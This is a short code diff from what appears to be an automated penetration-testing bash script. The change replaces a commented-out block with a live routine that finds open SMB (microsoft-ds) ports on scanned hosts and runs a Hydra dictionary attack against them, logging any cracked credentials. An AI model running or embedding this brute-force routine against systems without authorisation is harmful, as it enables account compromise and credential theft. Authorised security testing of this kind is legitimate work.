@@ -521,16 +521,14 @@ for i in $(seq $LOWER_HOST 1 $UPPER_HOST); do
             done;
         }
 
-        ##smb
-        #tcp_service_on "open" "445" > /dev/null && {
-            #echo '--------------------------';
-            #echo 'START BRUTE FORCE SMB...';
-            #echo '--------------------------';
-            #hydra -s 445 -F -o "$file_path/EX/HYDRA/cred_smb" -L $USERLIST_HYDRA_SMB -P $PASSLIST_HYDRA -t 16 -m BothHash $host smb > /dev/null;
-            #echo '--------------------------';
-            #echo 'END BRUTE FORCE SMB';
-            #echo '--------------------------';
-        #}
+        #smb
+        tcp_service_on 'open' 'microsoft-ds' '0' && {
+            print_succ 'starting dictionary attack against SMB service...';
+            for PORT in $(print_portid 'open' 'microsoft-ds' '0'); do
+            hydra -s $PORT -v -V -o "$FILE_PATH/DA/PASSWORD/cred_smb" -L $USERLIST_HYDRA_SMB -P $PASSLIST_HYDRA_SMB -t 4 $HOST smb &> "$FILE_PATH/DA/EVIDENCE/smb_attack"
+            print_std "$(grep 'host:' "$FILE_PATH/DA/PASSWORD/cred_smb" || echo 'PASSWORD NOT FOUND')"
+            done;
+        }
     fi
     
 done
